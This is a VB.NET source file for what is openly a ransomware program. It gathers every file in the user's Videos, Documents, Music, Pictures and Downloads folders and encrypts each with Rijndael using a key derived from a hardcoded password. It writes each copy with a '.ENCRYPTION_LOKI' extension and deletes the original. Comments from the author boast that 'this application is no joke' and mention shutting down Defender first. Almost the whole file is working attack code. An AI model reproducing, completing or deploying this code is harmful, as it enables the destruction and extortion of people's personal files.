Imports System.IO
Imports System.Security.Cryptography

Public Class Form1

    Private HOST As String
    Private FILTER_INPUT As FileStream
    Private FILTER_OUTPUT As FileStream
    Private ENCRYPT_DIRECTORIES As String
    Private DECRYPT_DIRECTORIES As String
    Public Property ICESTREAM As Object



    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'NATIVE METHODS START>>>
        Dim ALLSPARK As New NativeMethods()
        Dim spath As String = NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Videos)
        Dim spath1 As String = NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Documents)
        Dim spath2 As String = NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Music)
        Dim spath3 As String = NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Pictures)
        Dim spath4 As String = NativeMethods.GetSpecialFolder(NativeMethods.ShellSpecialFolders.Downloads)

        'Native Video
        For Each foundfile As String In My.Computer.FileSystem.GetFiles(spath, FileIO.SearchOption.SearchAllSubDirectories)
            Dim a As Integer = &HA
            Do
                If (a = &HF) Then

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                    a += &H1

                    Continue Do

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                End If
                a += &H1

            Loop While (a < &H14)

        Next

        'Native Music
        For Each foundfile As String In My.Computer.FileSystem.GetFiles(spath1, FileIO.SearchOption.SearchAllSubDirectories)
            Dim a As Integer = &HA
            Do
                If (a = &HF) Then

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                    a += &H1

                    Continue Do

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                End If
                a += &H1

            Loop While (a < &H14)

        Next

        'Native Pictures
        For Each foundfile As String In My.Computer.FileSystem.GetFiles(spath2, FileIO.SearchOption.SearchAllSubDirectories)
            Dim a As Integer = &HA
            Do
                If (a = &HF) Then

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                    a += &H1

                    Continue Do

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                End If
                a += &H1

            Loop While (a < &H14)

        Next

        'Native Documents
        For Each foundfile As String In My.Computer.FileSystem.GetFiles(spath3, FileIO.SearchOption.SearchAllSubDirectories)
            Dim a As Integer = &HA
            Do
                If (a = &HF) Then

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                    a += &H1

                    Continue Do

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                End If
                a += &H1

            Loop While (a < &H14)

        Next

        'Native Downloads
        For Each foundfile As String In My.Computer.FileSystem.GetFiles(spath4, FileIO.SearchOption.SearchAllSubDirectories)
            Dim a As Integer = &HA
            Do
                If (a = &HF) Then

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                    a += &H1

                    Continue Do

                    If foundfile.EndsWith(".ENCRYPTION") Then

                    Else

                        Rat_RUN.Items.Add(foundfile)

                    End If

                End If
                a += &H1

            Loop While (a < &H14)

        Next
        'END OF NATIVE METHOD
    End Sub

    Public Function GUARDIAN(PASSMANAGER As String) As Byte()
        Dim Data() As Char = PASSMANAGER.ToCharArray
        Dim Length As Integer = Data.GetUpperBound(&H0)
        Dim HASH_DATA(Length) As Byte

        For i As Integer = 0 To Data.GetUpperBound(&H0)

            HASH_DATA(i) = CByte(Asc(Data(i)))
        Next

        Dim SHA512 As New SHA512Managed

        Dim HASH_RESULT As Byte() = SHA512.ComputeHash(HASH_DATA)

        Dim KEY(&H1F) As Byte

        For i As Integer = &H0 To &H1F

            KEY(i) = HASH_RESULT(i)

        Next

        Return KEY

    End Function

    Public Function CREATION_POOL(PASSMANAGER As String) As Byte()

        'Convert strPassword to an array and store in chrData.
        Dim Data() As Char =
            PASSMANAGER.ToCharArray
        'Use intLength to get strPassword size.
        Dim Length As Integer =
            Data.GetUpperBound(&H0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim HASH_DATA(Length) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer =
            &H0 To Data.GetUpperBound(&H0)

            HASH_DATA(i) =
                CByte(Asc(Data(i)))

        Next

        'Declare bytIV(15).  It will hold 128 bits.
        Dim IV(&HF) As Byte

        'Use For Next to put a specific size (128 bits) of
        'bytResult into bytIV. The 0 To 30 for bytKey used the first 256 bits.
        'of the hashed password. The 32 To 47 will put the next 128 bits into bytIV.
        For i As Integer = &H20 To &H2F
            'Declare what hash to use.
            Dim SHA512 As New SHA512Managed
            'Declare bytResult, Hash bytDataToHash and store it in bytResult.
            Dim Result As Byte() = SHA512.ComputeHash(HASH_DATA)

            IV(i - &H20) = Result(i)

        Next

        Return IV 'return the IV

    End Function

    Public Enum CryptoAction
        HashEncrypt = &H1
        HashDecrypt = &H2
    End Enum

    Public Sub HASH_PASSAGE(ENCRYPT_DIRECTORIES As String, DECRYPT_DIRECTORIES As String, Key() As Byte, IV() As Byte, Guide As CryptoAction)

        Try
            'In case of errors.
            'Setup file streams to handle input and output.
            FILTER_INPUT = New FileStream(ENCRYPT_DIRECTORIES, FileMode.Open,
                                                       FileAccess.Read)
            FILTER_OUTPUT = New FileStream(DECRYPT_DIRECTORIES, FileMode.OpenOrCreate,
                                                    FileAccess.Write)
            FILTER_OUTPUT.SetLength(&H0) 'make sure fsOutput is empty
            'Setup Progress Bar
            ProgressBar2.Value = &H0

            ProgressBar2.Maximum = &H64

            Dim ICESTREAM As CryptoStream

            'Declare your CryptoServiceProvider.
            Dim RijndaelCryptography As New RijndaelManaged

            'Determine if encryption or decryption sets up cryptostream
            Select Case Guide
                Case CryptoAction.HashEncrypt

                    ICESTREAM = New CryptoStream(FILTER_OUTPUT, RijndaelCryptography.CreateEncryptor(Key, IV), CryptoStreamMode.Write)

                Case CryptoAction.HashDecrypt
                    ICESTREAM = New CryptoStream(FILTER_OUTPUT, RijndaelCryptography.CreateDecryptor(Key, IV), CryptoStreamMode.Write)

            End Select

            Dim LENGTH_PROTOCOL As Long = FILTER_INPUT.Length 'THE INPUT FILE LENGTH

            Dim RUNNING_COUNT_BYTE_PROCESS As Long = &H0 'RUNNING COUNT OF BYTES PROCESSED

            'TIME TO DECLARE...VARIABLES FOR ENCRYPTION/DECRYPTION ALSO LOOPING UNTIL ALL FILES ARE PROCESSED...VERY IMPORTANT
            While RUNNING_COUNT_BYTE_PROCESS < LENGTH_PROTOCOL

                Dim BLOCK_BYTE(&H1000) As Byte ' HOLDS A BLOCK OF BYTES

                Dim CURRENT_BYTE_PROCESSED As Integer = FILTER_INPUT.Read(BLOCK_BYTE, &H0, &H1000)

                ICESTREAM.Write(BLOCK_BYTE, &H0, CURRENT_BYTE_PROCESSED)

                RUNNING_COUNT_BYTE_PROCESS += CLng(CURRENT_BYTE_PROCESSED)

                ProgressBar2.Value = CInt((RUNNING_COUNT_BYTE_PROCESS / LENGTH_PROTOCOL) * &H64)
            End While

            If ICESTREAM IsNot Nothing Then ICESTREAM.Close()

            If FILTER_INPUT IsNot Nothing Then FILTER_INPUT.Close()
            If FILTER_OUTPUT IsNot Nothing Then FILTER_OUTPUT.Close()

            If Guide = CryptoAction.HashEncrypt Then

                Dim UNIQUE As New FileInfo(ENCRYPT_DIRECTORIES)
                UNIQUE.Delete()


            End If

            If Guide = CryptoAction.HashDecrypt Then

                Dim BLISTER As New FileInfo(DECRYPT_DIRECTORIES)
                BLISTER.Delete()

            End If

            Dim UPDATER As String = $"{Chr(&HD)}{Chr(&HA)}"

            If Guide = CryptoAction.HashEncrypt Then

                'update the listbox...
                Debug.WriteLine("Encryption Complete" + UPDATER + UPDATER + "Total bytes processed = " + RUNNING_COUNT_BYTE_PROCESS.ToString, "Done")
            Else
                Debug.WriteLine("Decryption Complete" + UPDATER + UPDATER + "Total bytes processed = " + RUNNING_COUNT_BYTE_PROCESS.ToString, "Done")

            End If
            'Time to catch errors...
            'NOW I'LL DO YOU A SOLID. FOR A FULL LIST OF ERROR CODING NUMBERS: https://www.fmsinc.com/microsoftaccess/errors/ErrorNumber_Description2010.html
        Catch When Err.Number = &H35 'If file isn't found

            Debug.WriteLine("Please check to make sure the path and filename" + "are correct and if the file exists.", "Invalid Path or Filename")

        Catch
            If Guide = CryptoAction.HashDecrypt Then

                Dim UPDATER As New FileInfo(HOST)
                UPDATER.Delete()


            End If

        End Try

        If FILTER_INPUT IsNot Nothing Then FILTER_INPUT.Close()
        If FILTER_OUTPUT IsNot Nothing Then FILTER_OUTPUT.Close()


    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        'we must properly time this...
        Try
            ProgressBar1.Maximum = Rat_RUN.Items.Count

            If ProgressBar1.Value = Rat_RUN.Items.Count Then
                Timer1.Stop()
                Application.Exit() 'WHEN THE APP COMPLETES IT'S ENCRYPTION, IT WILL SHUT ITSELF DOWN

            Else
                Rat_RUN.SelectedIndex = ProgressBar1.Value

                Rat_RUN.SelectionMode = SelectionMode.One

                HOST = CStr(Rat_RUN.SelectedItem)

                Try

                    'Send the password to the CreateKey Function
                    Dim Key As Byte() = GUARDIAN("ETERNAL_POOL")

                    'SENDS THE PASSWORD TO THE CREATEIV FUNCTION
                    Dim IV As Byte() = CREATION_POOL("ETERNAL_POOL")

                    'NOW WE START THE ENCRYPTION PROCESS...
                    HASH_PASSAGE(HOST, HOST + ".ENCRYPTION_LOKI", Key, IV, CryptoAction.HashEncrypt)

                Catch ex As Exception
                    'WE MAY NEED TO USE THIS...
                    'Debug.WriteLine("Error : {0}", HOST)

                End Try
                'NOW THE PROGRESSBAR
                ProgressBar1.Increment(&H1) '<<< interval: 100


            End If
        Catch ex As Exception
            'WE MAY NEED TO USE THIS...
            'Debug.WriteLine("Error : {0}", HOST)
        End Try
    End Sub

    ' THE FOLLOWING DELEGATE MAY SEEM UNIMPORTANT BUT WITHOUT IT, THE APP WILL FAIL TO WORK.ITS WORKING WAIT AND SEE IT WILL TAKE A BIT
    Public Delegate Sub ProgressReportDelegate(value As Int32)
    'YOU CAN FAST FORWARD TO THE ENDING RESULTS
    'SO, AS YOU CAN SEE, THIS APPLICATION IS NO JOKE...THIS IS RYTHORIAN SIGNING OUT, CLASS DISMEMBERED...

    Private Sub ReportProgress(v As Integer)

        If progBar.InvokeRequired Then

            progBar.Invoke(Sub() progBar.Value = v)

        Else

            progBar.Value = v

            progBar.Invalidate()

        End If

    End Sub
    'WE SHOULD BE READY TO GO...WATCH THOSE FOLDERS...FIRST I HAVE TO SHUTDOWN DEFENDER...
End Class
